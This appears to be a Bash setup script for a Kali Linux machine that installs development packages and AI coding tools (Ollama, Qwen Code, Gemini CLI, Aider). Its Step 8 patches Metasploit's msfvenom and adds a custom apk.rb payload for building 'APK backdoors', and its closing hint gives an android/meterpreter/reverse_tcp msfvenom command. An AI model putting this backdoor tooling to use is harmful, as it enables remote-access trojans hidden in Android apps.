#!/bin/bash
# Kali Linux-specific setup script

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

log_info() { echo -e "${BLUE}[INFO]${NC} $1"; }
log_success() { echo -e "${GREEN}[OK]${NC} $1"; }
log_warn() { echo -e "${YELLOW}[WARN]${NC} $1"; }
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }
log_step() { echo -e "${CYAN}[STEP]${NC} $1"; }

echo -e "${CYAN}"
echo "======================================"
echo "   Kali Linux Development Setup"
echo "======================================"
echo -e "${NC}"

# Step 1: Update and install dependencies
log_step "Updating packages and installing dependencies"
sudo apt update
sudo apt upgrade -y
sudo apt install -y python3 python3-pip nodejs npm git wget curl build-essential \
    ripgrep golang-go default-jdk metasploit-framework apktool

# Step 2: Setup NVM (use user installation)
log_step "Setting up NVM"
if [ ! -d "$HOME/.nvm" ]; then
    curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash
fi

export NVM_DIR="$HOME/.nvm"
[ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"
nvm install --lts
nvm use --lts

# Step 3: Setup Go paths
log_step "Setting up Go environment"
export GOPATH="$HOME/go"
export PATH="$PATH:$GOPATH/bin"

# Step 4: Setup Ollama
log_step "Setting up Ollama"
if ! command -v ollama &> /dev/null; then
    curl -fsSL https://ollama.com/install.sh | sh
fi
ollama pull qwen2.5-coder:1.5b 2>/dev/null || log_warn "Failed to pull Ollama model"

# Step 5: Install AI coding tools
log_step "Installing AI coding tools"

# Install Qwen Code
npm install -g @qwen-code/qwen-code

# Install Gemini CLI
npm install -g @google/gemini-cli

# Install Aider
pip3 install aider-chat

# Step 6: Setup APK tools (optional)
log_step "Setting up APK tools"
if [ -f "setup-apktools.sh" ]; then
    ./setup-apktools.sh
fi

# Step 7: Copy configuration files
log_step "Copying configuration files"

# Backup existing configs
for config in .bashrc .gitconfig .profile; do
    if [ -f "$HOME/$config" ] && [ ! -f "$HOME/$config.backup" ]; then
        cp "$HOME/$config" "$HOME/$config.backup"
        log_info "Backed up $HOME/$config"
    fi
done

cp -n configs/.bashrc "$HOME/.bashrc" 2>/dev/null || true
cp -n configs/.gitconfig "$HOME/.gitconfig" 2>/dev/null || true
cp -n configs/.profile "$HOME/.profile" 2>/dev/null || true

mkdir -p "$HOME/.qwen"
cp -n configs/.qwen/settings.json "$HOME/.qwen/settings.json" 2>/dev/null || true

cp -n configs/.aider.conf.yml "$HOME/.aider.conf.yml" 2>/dev/null || true
cp -n scripts/termux_cli_manager.py "$HOME/termux_cli_manager.py" 2>/dev/null || true

# Step 8: Apply Metasploit patches
log_step "Applying Metasploit patches for APK backdoor"
if [ -d "/usr/share/metasploit-framework" ]; then
    MSF_DIR="/usr/share/metasploit-framework"
    
    # Patch msfvenom to support --use-aapt
    if [ -f "$MSF_DIR/msfvenom" ]; then
        if ! grep -q "#patched" "$MSF_DIR/msfvenom"; then
            cp "$MSF_DIR/msfvenom" "$MSF_DIR/msfvenom.orig"
            # Add --use-aapt option
            line_num=$(grep -n "help" "$MSF_DIR/msfvenom" | head -1 | cut -d ":" -f1)
            line_num=$((line_num - 1))
            sed -i "${line_num}a\\    opt.on('--use-aapt','Use aapt for recompiling') do\\n      opts[:use_aapt] = true\\n    end" "$MSF_DIR/msfvenom"
            echo "#patched" >> "$MSF_DIR/msfvenom"
            log_info "Patched msfvenom"
        fi
    fi
    
    # Copy apk.rb payload
    if [ -f "scripts/apk.rb" ]; then
        cp scripts/apk.rb "$MSF_DIR/lib/msf/core/payload/" 2>/dev/null || true
        log_info "Copied apk.rb payload"
    fi
fi

# Step 9: Setup environment
log_step "Setting up environment"
if [ -f ".env.template" ]; then
    cp .env.template .env
    log_info "Created .env from template"
    log_warn "Please edit .env and add your API keys"
fi

echo ""
log_success "Kali Linux setup complete!"
echo ""
echo "Next steps:"
echo "1. Edit .env file and add your API keys"
echo "2. Run: source ~/.bashrc"
echo "3. Start Ollama: ollama serve"
echo "4. Try: qwen or gemini"
echo "5. For APK backdoor: msfvenom -p android/meterpreter/reverse_tcp --use-aapt"
echo ""
